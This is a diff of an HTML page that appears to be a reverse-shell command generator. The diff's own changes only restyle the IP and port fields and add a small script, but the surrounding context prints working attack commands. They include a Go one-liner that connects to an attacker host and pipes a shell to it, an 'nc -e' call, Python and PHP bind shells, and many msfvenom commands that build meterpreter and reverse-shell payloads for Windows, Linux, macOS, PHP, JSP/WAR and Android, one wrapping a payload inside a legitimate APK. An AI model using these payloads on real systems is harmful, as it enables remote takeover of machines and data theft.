+    <p style="color:red;" id="port seventy three"></p>
     
      <p> &nbsp</p>
      </div> 
@@ -2778,12 +2794,12 @@ ref.add(new StringRefAddr("x", x);</p>
    <div id="mydiv">
     <p> echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","</p>
     
-     <p id="ip seventy four"></p>
+     <p style="color:red;" id="ip seventy four"></p>
      <p> :</p>
-    <p id="port seventy four"></p>
+    <p style="color:red;" id="port seventy four"></p>
    <p> ");cmd:=exec.Command("</p>
     
-    <div class="fourty"> </div>
+    <div style="color:red;" class="fourty"> </div>
           </div>
     <p>");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' </p>
     <p>  > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go </p>
@@ -2799,11 +2815,11 @@ ref.add(new StringRefAddr("x", x);</p>
   <p>Command:</p>
   <div id="mydiv">
     <p> echo 'import os' > /tmp/t.v && echo 'fn main() { os.system("nc -e &nbsp</p>
-     <div class="fourtyone"> </div>
+     <div style="color:red;" class="fourtyone"> </div>
   <p>  &nbsp</p>
-  <p id="ip seventy five"></p>
+  <p style="color:red;" id="ip seventy five"></p>
      <p> &nbsp</p>
-    <p id="port seventy five"></p>
+    <p style="color:red;" id="port seventy five"></p>
 <p>    &nbsp</p>
    </div>
     
@@ -2844,7 +2860,7 @@ ref.add(new StringRefAddr("x", x);</p>
  <p> s1.setsockopt(s.SOL_SOCKET,</p>
  <p> s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",</p>
  
-<p id="port again"></p>
+<p style="color:red;" id="port again"></p>
  
 <p>
 ));s1.listen(1);c,a=s1.accept();</p>
@@ -2872,7 +2888,7 @@ ref.add(new StringRefAddr("x", x);</p>
   <p>socket_bind($s,"0.0.0.0",</p>
  
  
- <p id="port once again"></p>
+ <p style="color:red;" id="port once again"></p>
  
  <p>
  );</p>
@@ -2935,9 +2951,9 @@ ref.add(new StringRefAddr("x", x);</p>
    <p>msfvenom -p windows/x64/meterpreter/reverse_tcp &nbsp </p>
      <div id="mydiv">
    <p>LHOST=</p>
-   <p id="ip one"></p>
+   <p style="color:red;" id="ip one"></p>
    <p> &nbsp LPORT=</p>
-   <p id="port one"></p>
+   <p style="color:red;" id="port one"></p>
    <p>&nbsp -f exe -o reverse.exe</p>
  </div>
   </div>
@@ -2949,10 +2965,10 @@ ref.add(new StringRefAddr("x", x);</p>
   <p>msfvenom -p windows/x64/meterpreter_reverse_tcp &nbsp </p>
    <div id="mydiv">
    <p>LHOST=</p>
-   <p id="ip two"></p>
+   <p style="color:red;" id="ip two"></p>
    <p> &nbsp LPORT=</p>
   
-    <p id="port two"></p>
+    <p style="color:red;" id="port two"></p>
 <p>&nbsp -f exe -o reverse.exe</p>
   
  </div>
@@ -2964,9 +2980,9 @@ ref.add(new StringRefAddr("x", x);</p>
 <p> msfvenom -p windows/x64/shell/reverse_tcp &nbsp </p>
 <div id="mydiv">
 <p>LHOST=</p>
-<p id="ip three"></p>
+<p style="color:red;" id="ip three"></p>
  <p> &nbsp LPORT=</p>
-    <p id="port three"></p>
+    <p style="color:red;"  id="port three"></p>
 <p>&nbsp -f exe -o reverse.exe</p>
  
 </div>
@@ -2978,10 +2994,10 @@ ref.add(new StringRefAddr("x", x);</p>
 <p> msfvenom -p windows/x64/shell_reverse_tcp &nbsp </p>
  <div id="mydiv">
 <p>LHOST=</p>
-<p id="ip four"></p>
+<p style="color:red;" id="ip four"></p>
 
  <p>&nbsp LPORT=</p>
-    <p id="port four"></p>
+    <p style="color:red;" id="port four"></p>
 <p>&nbsp -f exe -o reverse.exe</p>
 
  
@@ -2995,10 +3011,10 @@ ref.add(new StringRefAddr("x", x);</p>
     <div id="mydiv">
 <p>LHOST=</p>
 
- <p id="ip five"></p>
+ <p style="color:red;" id="ip five"></p>
 <p>&nbsp LPORT=</p>
 
-<p id="port five"></p>
+<p style="color:red;" id="port five"></p>
 
 <p>&nbsp -f elf -o reverse.elf</p>
 
@@ -3012,9 +3028,9 @@ ref.add(new StringRefAddr("x", x);</p>
 <p> msfvenom -p linux/x64/shell_reverse_tcp &nbsp </p>
     <div id="mydiv">
 <p>LHOST=</p>
-<p id="ip six"></p>
+<p style="color:red;" id="ip six"></p>
 <p>&nbsp LPORT=</p>
-<p id="port six"></p>
+<p style="color:red;" id="port six"></p>
 <p> &nbsp -f elf -o reverse.elf</p>
 
 
@@ -3038,11 +3054,11 @@ ref.add(new StringRefAddr("x", x);</p>
 <p> msfvenom -p osx/x64/meterpreter/reverse_tcp &nbsp </p>
     <div id="mydiv">
 <p>LHOST=</p>
-<p id="ip seven"></p>
+<p style="color:red;" id="ip seven"></p>
 
 <p>&nbsp LPORT=</p>
 
-<p id="port seven"></p>
+<p style="color:red;" id="port seven"></p>
 <p>&nbsp -f macho -o shell.macho</p>
 
 </div>
@@ -3055,11 +3071,11 @@ ref.add(new StringRefAddr("x", x);</p>
 
     <div id="mydiv">
 <p>LHOST=</p>
-<p id="ip eight"></p>
+<p style="color:red;" id="ip eight"></p>
 
 <p>&nbsp LPORT=</p>
 
-<p id="port eight"></p>
+<p style="color:red;" id="port eight"></p>
 <p>&nbsp -f macho -o shell.macho</p>
  
 </div>
@@ -3072,11 +3088,11 @@ ref.add(new StringRefAddr("x", x);</p>
     <div id="mydiv">
 <p>LHOST=</p>
 
-<p id="ip nine"></p>
+<p style="color:red;"  id="ip nine"></p>
 <p>&nbsp LPORT=</p>
 
 
-<p id="port nine"></p>
+<p style="color:red;" id="port nine"></p>
 
 <p>&nbsp -f macho -o shell.macho</p>
 </div>
@@ -3088,11 +3104,11 @@ ref.add(new StringRefAddr("x", x);</p>
 <p> msfvenom -p php/meterpreter_reverse_tcp &nbsp </p>
     <div id="mydiv">
 <p>LHOST=</p>
-<p id="ip ten"></p>
+<p style="color:red;" id="ip ten"></p>
 
 <p>&nbsp LPORT=</p>
 
-<p id="port ten"></p>
+<p style="color:red;" id="port ten"></p>
 <p>&nbsp  -f raw -o shell.php</p>
 
  </div>
@@ -3104,10 +3120,10 @@ ref.add(new StringRefAddr("x", x);</p>
 <p> msfvenom -p php/reverse_php &nbsp   </p>
     <div id="mydiv">
 <p>LHOST=</p>
-<p id="ip eleven"></p>
+<p style="color:red;" id="ip eleven"></p>
 <p>&nbsp LPORT=</p>
 
-<p id="port eleven"></p>
+<p style="color:red;" id="port eleven"></p>
 <p> &nbsp -o shell.php</p>
 </div>
 
@@ -3118,10 +3134,10 @@ ref.add(new StringRefAddr("x", x);</p>
      <div id="mydiv">
 <p> msfvenom -p java/jsp_shell_reverse_tcp &nbsp </p>
 <p>LHOST=</p>
-<p id="ip twelve"></p>
+<p style="color:red;" id="ip twelve"></p>
 <p>&nbsp LPORT=</p>
 
-<p id="port twelve"></p>
+<p style="color:red;" id="port twelve"></p>
 <p> &nbsp -f raw -o shell.jsp</p>
 
 
@@ -3134,12 +3150,12 @@ ref.add(new StringRefAddr("x", x);</p>
 <p> msfvenom -p java/jsp_shell_reverse_tcp &nbsp </p>
     <div id="mydiv">
 <p>LHOST=</p>
-<p id="ip thirteen"></p>
+<p style="color:red;" id="ip thirteen"></p>
 
 <p>&nbsp LPORT=</p>
 
 
-<p id="port thirteen"></p>
+<p style="color:red;" id="port thirteen"></p>
 <p>&nbsp -f war -o shell.war</p>
 
 
@@ -3153,10 +3169,10 @@ ref.add(new StringRefAddr("x", x);</p>
 </p>    
     <div id="mydiv">
 <p>lhost=</p>
-<p id="ip fourteen"></p>
+<p style="color:red;" id="ip fourteen"></p>
 
  <p> &nbsp lport=</p>
-<p id="port fourteen"></p>
+<p style="color:red;" id="port fourteen"></p>
 <p> &nbsp R -o malicious.apk</p>
 
  </div>
@@ -3169,12 +3185,12 @@ ref.add(new StringRefAddr("x", x);</p>
 <p> msfvenom --platform android -x template-app.apk -p android/meterpreter/reverse_tcp  &nbsp 
 </p>
 <p> lhost=</p>
-<p id="ip fifteen"></p>
+<p style="color:red;" id="ip fifteen"></p>
 
 <p>
 &nbsp lport=
 </p>
-<p id="port fifteen"></p>
+<p style="color:red;" id="port fifteen"></p>
 
 <p>
  &nbsp -o payload.apk</p>
@@ -3190,12 +3206,12 @@ ref.add(new StringRefAddr("x", x);</p>
 </p>
     <div id="mydiv">
 <p> LHOST=</p>
-<p id="ip sixteen"></p>
+<p style="color:red;" id="ip sixteen"></p>
 
 <p>
 &nbsp LPORT=</p>
 
-<p id="port sixteen"></p>
+<p style="color:red;" id="port sixteen"></p>
 <p>
 
 &nbsp -f raw -o shell.py</p>
@@ -3212,11 +3228,11 @@ ref.add(new StringRefAddr("x", x);</p>
 </p>
     <div id="mydiv">
 <p> LHOST=</p>
-<p id="ip seventeen"></p>
+<p style="color:red;" id="ip seventeen"></p>
 <p>
 &nbsp LPORT=</p>
 
-<p id="port seventeen"></p>
+<p style="color:red;" id="port seventeen"></p>
 <p>
 &nbsp -f raw -o shell.sh</p>
 
@@ -3635,6 +3651,15 @@ fourty.addEventListener('change', (event) => {
 
 
 </script>
+ <script>
+const twohundred = document.querySelector('.shell');
+
+twohundred.addEventListener('change', (event) => {
+  const twohundred = document.querySelector('.twohundred');
+  twohundred.textContent = `  ${event.target.value}`;
+});
+
+</script>
      <script>
 // Side navigation
 function w3_open() {
@@ -3982,3 +4007,4 @@ document.getElementById("port fifty five").innerHTML = text;
 </body>
 </html>
 
+ 
